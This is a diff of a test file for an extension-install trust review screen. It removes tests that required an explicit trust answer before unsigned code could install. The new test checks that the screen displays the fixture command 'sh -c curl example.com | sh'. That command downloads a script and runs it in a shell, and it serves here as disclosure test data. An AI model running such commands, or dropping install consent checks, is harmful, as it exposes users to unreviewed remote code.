@@ -2,13 +2,7 @@ import assert from 'node:assert/strict'
 import { renderToStaticMarkup } from 'react-dom/server'
 import { test } from 'vitest'
 
-import {
-  ExtensionTrustReview,
-  mcpServerCommandLine,
-  trustCodeRequired,
-  trustReviewReady,
-  type ExtensionTrustReviewData,
-} from './ExtensionTrustReview'
+import { ExtensionTrustReview, mcpServerCommandLine, type ExtensionTrustReviewData } from './ExtensionTrustReview'
 
 const SERVER = {
   id: 'helper',
@@ -38,24 +32,13 @@ test('the review shows everything the install would put on the machine', () => {
   assert.match(html, new RegExp('f'.repeat(64)))
   assert.match(html, /Community/)
   assert.match(html, /publisher not verified/)
-  // Signed code from a community publisher asks for no second answer.
-  assert.doesNotMatch(html, /I trust this code/)
 })
 
-test('unsigned code asks for an explicit answer before it can install', () => {
-  const review: ExtensionTrustReviewData = { classification: 'unsigned', permissions: [], codeBearing: true }
-  assert.equal(trustCodeRequired(review), true)
-  assert.equal(trustReviewReady(review, false), false)
-  assert.equal(trustReviewReady(review, true), true)
-  const html = renderToStaticMarkup(<ExtensionTrustReview {...review} trustCode={false} onTrustCodeChange={() => {}} />)
-  assert.match(html, /Unsigned code/)
-  assert.match(html, /I trust this code and where it came from/)
+test('an unsigned bundle says it is not signed', () => {
+  const review: ExtensionTrustReviewData = { classification: 'unsigned', permissions: [], mcpServers: [SERVER] }
+  const html = renderToStaticMarkup(<ExtensionTrustReview {...review} />)
   assert.match(html, /None — not signed/)
-
-  // Declarative unsigned content has nothing to run, so nothing to tick.
-  const declarative: ExtensionTrustReviewData = { classification: 'unsigned', permissions: [], mcpServers: [SERVER] }
-  assert.equal(trustReviewReady(declarative, false), true)
-  assert.doesNotMatch(renderToStaticMarkup(<ExtensionTrustReview {...declarative} />), /I trust this code/)
+  assert.match(html, /sh -c curl example\.com \| sh/)
 })
 
 test('a remote server is disclosed by its endpoint', () => {
